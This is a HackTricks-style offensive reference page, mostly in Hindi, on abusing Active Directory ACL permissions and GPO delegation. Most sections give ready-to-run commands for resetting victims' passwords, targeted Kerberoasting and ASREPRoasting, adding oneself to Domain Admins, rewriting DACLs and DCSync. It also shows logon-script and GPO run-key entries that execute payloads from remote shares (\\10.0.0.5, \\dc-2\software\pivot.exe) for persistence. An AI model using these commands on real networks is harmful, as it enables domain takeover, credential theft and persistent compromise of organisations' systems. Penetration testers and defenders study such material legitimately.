# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**यह पृष्ठ मुख्य रूप से निम्लिखित तकनीकों का सारांश है** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**। अधिक जानकारी के लिए, मूल लेख देखें।**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

यह अधिकार एक हमलावर को लक्षित उपयोगकर्ता खाते पर पूर्ण नियंत्रण प्रदान करता है। एक बार `GenericAll` अधिकारों की `Get-ObjectAcl` कमांड से पुष्टि हो जाने पर, एक हमलावर निम्न कर सकता है:

- **लक्षित का पासवर्ड बदलना**: `net user <username> <password> /domain` का उपयोग करके, हमलावर उपयोगकर्ता का पासवर्ड रीसेट कर सकता है।
- **Targeted Kerberoasting**: उपयोगकर्ता के खाते को kerberoastable बनाने के लिए उस खाते पर SPN असाइन करें, फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) hashes निकालें और उन्हें क्रैक करने का प्रयास करें।
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए pre-authentication अक्षम करें, जिससे उनका खाता ASREPRoasting के लिए असुरक्षित हो जाए।
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Rights on Group**

यह अधिकार किसी attacker को समूह की सदस्यताओं में हेरफेर करने की अनुमति देता है अगर उनके पास किसी समूह जैसे `Domain Admins` पर `GenericAll` rights हों। समूह का distinguished name `Get-NetGroup` से पहचानने के बाद, attacker निम्न कर सकते हैं:

- **Add Themselves to the Domain Admins Group**: यह सीधे commands के माध्यम से या Active Directory या PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux से आप BloodyAD का उपयोग करके अपने आप को किसी भी समूह में जोड़ सकते हैं जब आपके पास उन पर GenericAll/Write सदस्यता हो। अगर लक्ष्य समूह “Remote Management Users” में nested है, तो आप उस समूह को मानने वाले hosts पर तुरंत WinRM access प्राप्त कर लेंगे:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

किसी computer object या user account पर ये privileges होने से संभव होता है:

- **Kerberos Resource-based Constrained Delegation**: एक computer object को takeover करने में सक्षम बनाता है।
- **Shadow Credentials**: इन privileges का उपयोग करके shadow credentials बनाकर किसी computer या user account का impersonate करने के लिए इस technique का इस्तेमाल करें।

## **WriteProperty on Group**

यदि किसी user के पास किसी विशेष group (उदा., `Domain Admins`) के लिए सभी objects पर `WriteProperty` rights हैं, तो वे निम्न कर सकते हैं:

- **Add Themselves to the Domain Admins Group**: `net user` और `Add-NetGroupUser` commands को combine करके हासिल किया जा सकता है; यह method डोमेन के भीतर privilege escalation की अनुमति देता है।
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

यह विशेषाधिकार हमलावरों को विशिष्ट समूहों में स्वयं को जोड़ने की अनुमति देता है, जैसे कि `Domain Admins`, उन कमांड्स के माध्यम से जो समूह सदस्यता को सीधे बदलते हैं। निम्नलिखित कमांड अनुक्रम का उपयोग करके स्वयं को जोड़ना संभव होता है:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

एक समान अधिकार, यह attackers को उन groups पर `WriteProperty` अधिकार होने पर group properties को बदलकर स्वयं को सीधे groups में जोड़ने की अनुमति देता है। इस अधिकार की पुष्टि और निष्पादन निम्न के साथ किया जाता है:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` होना वर्तमान password जाने बिना password reset करने की अनुमति देता है। इस अधिकार का सत्यापन और इसका शोषण PowerShell या वैकल्पिक command-line tools के माध्यम से किया जा सकता है, जो किसी user's password को reset करने के कई तरीके प्रदान करते हैं — जिनमें इंटरैक्टिव सेशंस और नॉन-इंटरैक्टिव वातावरण के लिए one-liners शामिल हैं। कमांड्स सरल PowerShell invocations से लेकर Linux पर `rpcclient` के उपयोग तक होते हैं, जो attack vectors की बहुमुखीता को दर्शाते हैं।
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Group पर WriteOwner**

अगर attacker पाते हैं कि उनके पास किसी group पर `WriteOwner` अधिकार हैं, तो वे उस group का स्वामित्व अपने नाम कर सकते हैं। यह विशेष रूप से तब प्रभावी होता है जब संबंधित group `Domain Admins` हो, क्योंकि स्वामित्व बदलने से group के attributes और membership पर व्यापक नियंत्रण मिल जाता है। प्रक्रिया में सही ऑब्जेक्ट की पहचान `Get-ObjectAcl` के माध्यम से करना और फिर `Set-DomainObjectOwner` का उपयोग करके owner को बदलना शामिल है, चाहे SID द्वारा हो या नाम द्वारा।
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

यह अनुमति attacker को user properties संशोधित करने की अनुमति देती है। विशेष रूप से, `GenericWrite` access के साथ, attacker एक user के logon script path को बदल सकता है ताकि user के logon पर एक malicious script execute हो सके। यह `Set-ADObject` command का उपयोग कर लक्ष्य user की `scriptpath` property को अपडेट करके हासिल किया जाता है, ताकि वह attacker की script की ओर इशारा करे।
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

इस विशेषाधिकार के साथ, हमलावर समूह सदस्यता को नियंत्रित कर सकते हैं, जैसे कि अपना या अन्य उपयोगकर्ताओं का किसी विशिष्ट समूह में जोड़ना। यह प्रक्रिया एक क्रेडेंशियल ऑब्जेक्ट बनाने, उसे उपयोग करके उपयोगकर्ताओं को समूह में जोड़ने या हटाने, और PowerShell कमांड्स से सदस्यता बदलावों की पुष्टि करने पर आधारित होती है।
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

किसी AD ऑब्जेक्ट का मालिक होना और उस पर `WriteDACL` अधिकार होना एक हमलावर को उस ऑब्जेक्ट पर अपने लिए `GenericAll` अधिकार देने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जो ऑब्जेक्ट पर पूर्ण नियंत्रण और उसके group memberships को संशोधित करने की अनुमति देता है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन विशेषाधिकारों का शोषण करने का प्रयास करते समय कुछ सीमाएँ होती हैं।
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **डोमेन पर प्रतिकृति (DCSync)**

DCSync attack डोमेन पर विशिष्ट प्रतिकरण अनुमतियों (replication permissions) का लाभ उठाकर एक Domain Controller की नकल करता है और डेटा को सिंक्रोनाइज़ करता है, जिसमें उपयोगकर्ता क्रेडेंशियल्स भी शामिल हैं। यह शक्तिशाली तकनीक `DS-Replication-Get-Changes` जैसी अनुमतियों की आवश्यकता करती है, जिससे हमलावर AD environment से संवेदनशील जानकारी निकाल सकते हैं बिना सीधे Domain Controller तक पहुंच के। [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO प्रतिनिधिकरण <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को प्रबंधित करने के लिए सौंपा गया एक्सेस गंभीर सुरक्षा जोखिम पैदा कर सकता है। उदाहरण के लिए, यदि `offense\spotless` जैसे उपयोगकर्ता को GPO प्रबंधन अधिकार दिए गए हैं, तो उनके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसे विशेषाधिकार हो सकते हैं। इन अनुमतियों का दुरुपयोग malicious उद्देश्यों के लिए किया जा सकता है, जैसा कि PowerView का उपयोग करके पहचाना जा सकता है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO अनुमतियों का अन्वेषण

गलत कॉन्फ़िगर किए गए GPOs की पहचान करने के लिए PowerSploit के cmdlets को एक साथ chain किया जा सकता है। इससे उन GPOs की खोज संभव होती है जिन्हें किसी विशिष्ट उपयोगकर्ता द्वारा प्रबंधित करने की अनुमति है: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**किसी दिए गए पॉलिसी पर लागू कंप्यूटर**: यह पता लगाया जा सकता है कि कोई विशिष्ट GPO किन कंप्यूटरों पर लागू होता है, जिससे संभावित प्रभाव का दायरा समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**किसी दिए गए कंप्यूटर पर लागू पॉलिसियाँ**: किसी विशेष कंप्यूटर पर कौन सी पॉलिसियाँ लागू हैं यह देखने के लिए `Get-DomainGPO` जैसे कमांड उपयोग किए जा सकते हैं।

**किसी पॉलिसी के तहत प्रभावित OUs**: किसी दिए गए पॉलिसी द्वारा प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

आप GPOs को enumerate करने और उनमें issues ढूँढने के लिए [**GPOHound**](https://github.com/cogiceo/GPOHound) टूल का भी उपयोग कर सकते हैं।

### GPO का दुरुपयोग - New-GPOImmediateTask

गलत कॉन्फ़िगर किए गए GPOs का दुरुपयोग कोड execute करने के लिए किया जा सकता है, उदाहरण के लिए एक immediate scheduled task बनाकर। इसका उपयोग प्रभावित मशीनों पर किसी उपयोगकर्ता को local administrators group में जोड़ने के लिए किया जा सकता है, जिससे privileges में काफी वृद्धि हो जाती है:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, यदि स्थापित है, नए GPOs बनाने और लिंक करने, और प्रभावित कंप्यूटरों पर backdoors निष्पादित करने के लिए preferences जैसे registry values सेट करने की अनुमति देता है। इस विधि के लिए GPO को अपडेट किया जाना और निष्पादन के लिए किसी उपयोगकर्ता का कंप्यूटर पर लॉग इन होना आवश्यक है:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse मौजूदा GPOs में टास्क जोड़कर या सेटिंग्स बदलकर नए GPOs बनाए बिना उनका दुरुपयोग करने का तरीका देता है। इस टूल के लिए परिवर्तन लागू करने से पहले मौजूदा GPOs को संशोधित करना या नए GPOs बनाने हेतु RSAT tools का उपयोग करना आवश्यक है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### पॉलिसी अपडेट जबरन लागू करें

GPO अपडेट सामान्यतः लगभग हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज करने के लिए, विशेषकर किसी परिवर्तन को लागू करने के बाद, लक्षित कंप्यूटर पर `gpupdate /force` कमांड का उपयोग कर तुरंत पॉलिसी अपडेट को जबरन लागू किया जा सकता है। यह कमांड यह सुनिश्चित करता है कि GPOs में किए गए किसी भी परिवर्तन को अगले स्वचालित अपडेट चक्र का इंतज़ार किए बिना लागू कर दिया जाए।

### अंतर्निहित विवरण

किसी दिए गए GPO के Scheduled Tasks का निरीक्षण करने पर, जैसे कि `Misconfigured Policy`, `evilTask` जैसे टास्क्स के जुड़ने की पुष्टि की जा सकती है। ये टास्क्स स्क्रिप्ट्स या कमांड-लाइन टूल्स के माध्यम से बनाए जाते हैं जो सिस्टम व्यवहार बदलने या privileges बढ़ाने का लक्ष्य रखते हैं।

टास्क की संरचना, जो `New-GPOImmediateTask` द्वारा जनरेरेट की गई XML configuration file में दिखाई देती है, शेड्यूल किए गए टास्क के विशिष्ट विवरण—जिसमें निष्पादित किए जाने वाले कमांड और उसके triggers शामिल हैं—को रेखांकित करती है। यह फ़ाइल दिखाती है कि GPOs के भीतर scheduled tasks किस तरह परिभाषित और प्रबंधित होते हैं, और नीति लागू करने के हिस्से के रूप में किसी भी कमांड या स्क्रिप्ट को चलाने का एक तरीका प्रदान करती है।

### उपयोगकर्ता और समूह

GPOs लक्षित सिस्टम पर उपयोगकर्ता और समूह सदस्यताओं में हेरफेर की भी अनुमति देते हैं। Users and Groups नीति फ़ाइलों को सीधे संपादित करके, हमलावर विशेष उपयोगकर्ताओं को privileged समूहों में जोड़ सकते हैं, जैसे स्थानीय `administrators` समूह। यह GPO प्रबंधन अनुमतियों के delegation के माध्यम से संभव होता है, जो नीति फ़ाइलों में नए उपयोगकर्ताओं को शामिल करने या समूह सदस्यताओं को बदलने की अनुमति देता है।

Users and Groups के लिए XML configuration file दिखाती है कि ये परिवर्तन कैसे लागू किए जाते हैं। इस फ़ाइल में प्रविष्टियाँ जोड़कर, विशिष्ट उपयोगकर्ताओं को प्रभावित सिस्टम्स पर उच्च अधिकार दिए जा सकते हैं। यह विधि GPO हेरफेर के माध्यम से सीधे privilege escalation का एक तरीका प्रदान करती है।

इसके अतिरिक्त, कोड निष्पादित करने या स्थायी पहुँच बनाए रखने के अन्य तरीके भी विचार किए जा सकते हैं—जैसे logon/logoff स्क्रिप्ट्स का उपयोग, autoruns के लिए registry keys में परिवर्तन, .msi फाइलों के माध्यम से सॉफ़्टवेयर इंस्टॉल करना, या service configurations को एडिट करना। ये तकनीकें GPOs के दुरुपयोग के जरिए पहुंच बनाए रखने और लक्षित सिस्टम्स को नियंत्रित करने के विभिन्न मार्ग प्रदान करती हैं।

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
